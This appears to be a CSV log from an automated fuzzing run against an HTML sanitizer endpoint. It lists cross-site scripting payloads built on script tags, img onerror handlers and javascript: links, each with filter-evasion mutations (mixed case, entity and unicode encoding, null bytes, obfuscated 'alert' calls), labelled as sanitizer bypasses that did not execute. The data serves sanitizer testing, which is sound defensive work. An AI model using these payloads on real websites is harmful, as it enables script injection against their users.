family,name,target,path,status,label,executed,hooks,payload
A,script+A12,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<script>alert(1)</script>
A,script+A13,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<script>alert(1)</script>
A,script+A14,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<script>/drfv/
alert(1)</script>"
A,script+A15,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<script>alert`1`</script>
A,script+A16,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<script>alert(1)</script>
A,script+A17,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<script>alert(1)</script>
A,script+A18,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
A,script+A19,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<script>alert(1)</script>
A,script+A20,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<script>alert(1)</script>
A,script+A21,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<script>top['al'+'ert'](1)</script>
A,script+A22,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<script>top[8680439..toString(30)](1)</script>
A,script+A23,purify,/purify/html,200,BYPASS_NOEXEC,False,[],search?q=ok <script>alert(1)</script>
A,script+A24,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<script <!--x-->>alert(1)</script>
A,script+A25,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<script>alert(1)</script>
A,script+A26,purify,/purify/html,200,BYPASS_NOEXEC,False,[],%00<script>alert(1)</script>
A,script+A27,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<script>top[/al/.source+/ert/.source](1)</script>
seed,img,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A1,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A2,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img SrC=x onERrOR=alert(1)>
A,img+A3,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img%0Asrc=x%0Aonerror=alert(1)>
A,img+A4,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<iMG Src=x OnERrOr=alerT(1)>
A,img+A5,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1) 
A,img+A6,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A7,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A8,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A9,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)><img src=x onerror=alert(1)>
A,img+A10,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A11,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A12,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A13,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A14,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A15,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert`1`>
A,img+A16,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A17,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A18,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A19,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A20,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)<
A,img+A21,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=top['al'+'ert'](1)>
A,img+A22,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=top[8680439..toString(30)](1)>
A,img+A23,purify,/purify/html,200,BYPASS_NOEXEC,False,[],search?q=ok <img src=x onerror=alert(1)>
A,img+A24,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1) <!--x-->>
A,img+A25,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=alert(1)>
A,img+A26,purify,/purify/html,200,BYPASS_NOEXEC,False,[],%00<img src=x onerror=alert(1)>
A,img+A27,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<img src=x onerror=top[/al/.source+/ert/.source](1)>
seed,jsurl,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:alert(1)"">x</a>"
A,jsurl+A1,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""&#14javascript:alert(1)"">x</a>"
A,jsurl+A2,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a hREf=""javascript:alert(1)"">x</a>"
A,jsurl+A3,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a%0Ahref=""javascript:alert(1)"">x</a>"
A,jsurl+A4,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<A hReF=""JaVAsCript:ALert(1)"">x</a>"
A,jsurl+A5,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:alert(1)"">x</a>"
A,jsurl+A6,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javas&NewLine;cript:alert(1)"">x</a>"
A,jsurl+A7,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javas&#x09;cript:alert(1)"">x</a>"
A,jsurl+A8,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:&#x61;&#x6c;&#x65;&#x72;&#x74;(1)"">x</a>"
A,jsurl+A9,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:alert(1)""><a href=""javascript:alert(1)"">x</a>"
A,jsurl+A10,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:alert(1)"">x</a>"
A,jsurl+A11,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:&#97;&#108;&#101;&#114;&#116;(1)"">x</a>"
A,jsurl+A12,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javas&colon;cript:alert(1)"">x</a>"
A,jsurl+A13,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javas&Tab;cript:alert(1)"">x</a>"
A,jsurl+A14,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:alert(1)"">x</a>"
A,jsurl+A15,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:alert`1`"">x</a>"
A,jsurl+A16,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:alert(1)"">x</a>"
A,jsurl+A17,purify,/purify/html,200,BYPASS_NOEXEC,False,[],<a href=javascript:alert(1)>x</a>
A,jsurl+A18,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:\u0061\u006c\u0065\u0072\u0074(1)"">x</a>"
A,jsurl+A19,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)"">x</a>"
A,jsurl+A20,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:alert(1)"">x</a>"
A,jsurl+A21,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:top['al'+'ert'](1)"">x</a>"
A,jsurl+A22,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:top[8680439..toString(30)](1)"">x</a>"
A,jsurl+A23,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"search?q=ok <a href=""javascript:alert(1)"">x</a>"
A,jsurl+A24,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:alert(1)"" <!--x-->>x</a>"
A,jsurl+A25,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""vbscript:alert(1)"">x</a>"
A,jsurl+A26,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"%00<a href=""javascript:alert(1)"">x</a>"
A,jsurl+A27,purify,/purify/html,200,BYPASS_NOEXEC,False,[],"<a href=""javascript:top[/al/.source+/ert/.source](1)"">x</a>"
